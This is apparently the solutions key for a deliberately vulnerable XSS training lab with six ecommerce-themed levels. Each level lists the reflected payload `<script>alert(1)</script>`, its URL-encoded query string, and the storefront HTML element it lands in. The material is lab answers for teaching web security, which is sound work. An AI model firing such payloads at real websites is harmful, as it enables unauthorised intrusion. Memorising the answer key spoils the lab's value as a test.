# ecommerce — solutions

Raw reflections in storefront widgets (titles, prices, filters, cart, reviews, breadcrumbs).

### ecommerce-level1

`/ecommerce/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in `<h1 class="product-title">`

### ecommerce-level2

`/ecommerce/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<span class="price">$...`

### ecommerce-level3

`/ecommerce/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in filter-tag `<span>`

### ecommerce-level4

`/ecommerce/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in `<td class="cart-item-name">`

### ecommerce-level5

`/ecommerce/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in review-body `<p>`

### ecommerce-level6

`/ecommerce/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in active breadcrumb `<li>`
